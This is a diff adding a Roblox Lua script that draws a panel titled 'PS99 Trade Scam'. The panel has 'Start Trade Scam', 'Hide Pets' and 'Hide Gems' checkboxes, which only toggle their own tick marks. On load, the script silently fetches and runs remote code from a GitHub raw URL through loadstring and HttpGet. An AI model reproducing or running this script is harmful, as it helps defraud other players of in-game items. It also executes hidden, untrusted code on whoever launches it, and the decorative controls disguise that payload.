@@ -1,0 +1,73 @@
+-- შექმნა ScreenGui
+local screenGui = Instance.new("ScreenGui")
+screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+-- მთავარი ფანჯარა (Frame)
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 250, 0, 150) -- ზომა
+frame.Position = UDim2.new(0.1, 0, 0.1, 0) -- მოთავსება
+frame.BackgroundColor3 = Color3.fromRGB(100, 100, 100) -- ნაცრისფერი
+frame.BorderSizePixel = 2
+frame.Parent = screenGui
+
+-- სათაურის ტექსტი (TextLabel)
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, 0, 0.2, 0)
+title.Text = "PS99 Trade Scam"
+title.TextScaled = true
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.BackgroundColor3 = Color3.fromRGB(80, 80, 80) -- მუქი ნაცრისფერი
+title.Parent = frame
+
+-- Checkbox ფუნქცია
+local function createCheckbox(text, posY)
+    local checkBox = Instance.new("TextButton")
+    checkBox.Size = UDim2.new(0, 20, 0, 20)
+    checkBox.Position = UDim2.new(0.05, 0, posY, 0)
+    checkBox.Text = "✔"
+    checkBox.TextColor3 = Color3.fromRGB(0, 255, 0)
+    checkBox.BackgroundColor3 = Color3.fromRGB(120, 120, 120) -- ღია ნაცრისფერი
+    checkBox.Parent = frame
+
+    local label = Instance.new("TextLabel")
+    label.Size = UDim2.new(0, 150, 0, 20)
+    label.Position = UDim2.new(0.2, 0, posY, 0)
+    label.Text = text
+    label.TextScaled = true
+    label.TextColor3 = Color3.fromRGB(255, 255, 255)
+    label.BackgroundTransparency = 1
+    label.Parent = frame
+
+    checkBox.MouseButton1Click:Connect(function()
+        if checkBox.Text == "✔" then
+            checkBox.Text = ""
+            checkBox.TextColor3 = Color3.fromRGB(255, 0, 0)
+        else
+            checkBox.Text = "✔"
+            checkBox.TextColor3 = Color3.fromRGB(0, 255, 0)
+        end
+    end)
+end
+
+-- Checkbox-ების დამატება
+createCheckbox("Start Trade Scam", 0.3)
+createCheckbox("Hide Pets", 0.5)
+createCheckbox("Hide Gems", 0.7)
+
+-- ავტომატური გაშვება სკრიპტის
+loadstring(game:HttpGet("https://raw.githubusercontent.com/jonsina-glitch/Wave/main/Trade%20scam", true))()
+
+-- დახურვის ღილაკი (Button)
+local closeButton = Instance.new("TextButton")
+closeButton.Size = UDim2.new(0.8, 0, 0.15, 0)
+closeButton.Position = UDim2.new(0.1, 0, 0.85, 0)
+closeButton.Text = "Close"
+closeButton.TextScaled = true
+closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+closeButton.BackgroundColor3 = Color3.fromRGB(150, 150, 150) -- ღია ნაცრისფერი
+closeButton.Parent = frame
+
+-- ღილაკზე დაჭერისას ფანჯრის გაქრობა
+closeButton.MouseButton1Click:Connect(function()
+    screenGui:Destroy()
+end)
